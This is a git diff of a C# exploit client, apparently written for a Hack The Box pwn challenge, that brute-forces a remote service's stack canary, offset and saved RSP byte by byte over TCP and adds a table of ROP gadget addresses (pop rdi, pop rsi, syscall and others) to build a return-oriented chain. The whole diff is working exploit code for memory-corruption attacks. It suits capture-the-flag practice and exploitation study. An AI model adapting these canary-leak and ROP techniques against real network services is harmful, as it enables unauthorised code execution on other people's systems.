@@ -1,20 +1,32 @@
 using System;
 using System.Collections.Generic;
 using System.Net;
+using System.Text;
 using System.Net.Sockets;
 
 namespace dSocket
 {
+    public class Rop
+    {
+        public const int RAX     = 0x0000000000000b51; // pop rax; ret
+        public const int RBP     = 0x0000000000000a90; // pop rbp; ret
+        public const int RDI     = 0x0000000000000f73; // pop rdi; ret
+        public const int RDX     = 0x0000000000000b53; // pop rdx; ret
+        public const int RSIplus = 0x0000000000000f71; // pop rsi; pop r15; ret
+        public const int RSPplus = 0x0000000000000f6d; // pop rsp; pop r13; pop r14; pop r15; ret
+        public const int LeaveR  = 0x0000000000000b6d; // leave ; ret
+        public const int Syscall = 0x0000000000000b55; // syscall ; ret
+    }
     class Program
     {
-        private const string Host = "docker.hackthebox.eu";
-        private const int Port = 45723;
+        private const string Host = "192.168.1.93";
+        private const int Port = 5555;
 
         private static Socket ConnectSocket()
         {
-            IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
-            IPAddress ipAddress = ipHostInfo.AddressList[0];
-            // IPAddress ipAddress = IPAddress.Parse(Host); 
+            // IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
+            // IPAddress ipAddress = ipHostInfo.AddressList[0];
+            IPAddress ipAddress = IPAddress.Parse(Host); 
             IPEndPoint ipe = new IPEndPoint(ipAddress, Port);
 
             Socket mySock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
@@ -51,7 +63,7 @@ namespace dSocket
             int totalFound = 0;
             byte[] bytes = new byte[1024];
 
-            while (totalFound < 16)
+            while (totalFound < 24)
             {
                 byte[] returnBuffer = new byte[inputBuffer.Length + 1];
                 for (int h = 0x00; h <= 0xff; h += 0x01)
@@ -65,11 +77,19 @@ namespace dSocket
 
                     // test new byte
                     Socket testSocket = ConnectSocket();
+                    testSocket.ReceiveTimeout = 1000;
                     int bytesRec = testSocket.Receive(bytes);
                     testSocket.Send(returnBuffer);
                     bytesRec = 0;
                     Array.Clear(bytes, 0, bytes.Length);
-                    bytesRec = testSocket.Receive(bytes);
+                    try
+                    {
+                        bytesRec = testSocket.Receive(bytes);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[!] Skipping dead byte..");
+                    }
                     testSocket.Close();
 
                     if (bytesRec > 0)
@@ -94,25 +114,43 @@ namespace dSocket
             }
 
             // display canary and offset
+            byte[] RSP = new byte[] { inputBuffer[1055], inputBuffer[1054], inputBuffer[1053], inputBuffer[1052],
+                                            inputBuffer[1051], inputBuffer[1050], inputBuffer[1049], inputBuffer[1048] };
             byte[] offSet = new byte[] { inputBuffer[1047], inputBuffer[1046], inputBuffer[1045], inputBuffer[1044],
                                             inputBuffer[1043], inputBuffer[1042], inputBuffer[1041], inputBuffer[1040] };
             byte[] caNary = new byte[] { inputBuffer[1039], inputBuffer[1038], inputBuffer[1037], inputBuffer[1036],
                                             inputBuffer[1035], inputBuffer[1034], inputBuffer[1033], inputBuffer[1032] };
             offSet = XorMe(offSet);
             caNary = XorMe(caNary);
+            RSP = XorMe(RSP);
 
             string canaryStr = "0x";
             string offsetStr = "0x";
+            string RSPStr = "0x";
 
             for (int j = 0; j < 8; j++)
             {
                 canaryStr += caNary[j].ToString("x2");
                 offsetStr += offSet[j].ToString("x2");
+                RSPStr += RSP[j].ToString("x2");
             }
 
-            Console.WriteLine("\n[-] Offset: {0}\tCanary: {1}", offsetStr, canaryStr);
+            Console.WriteLine("\n[-] Offset: {0}\tCanary: {1}\tRSP: {2}", offsetStr, canaryStr, RSPStr);            
 
             return inputBuffer;
+        }
+        private static byte[] GetRSP(byte[] inputBuffer)
+        {
+            /* the plan is:  
+             * send a byte.  
+             *  if it's wrong and not a dead byte, the connection will close.
+             *  if it's a dead byte, the connection will hang. set a timeout.
+             *  a good byte will say "Username found!" as expected.
+             *  don't stop on the first byte found!  there may be more.
+             */
+            byte[] toReturn = new byte[8];
+
+            return toReturn;
         }
         private static byte[] GetPayload()
         {
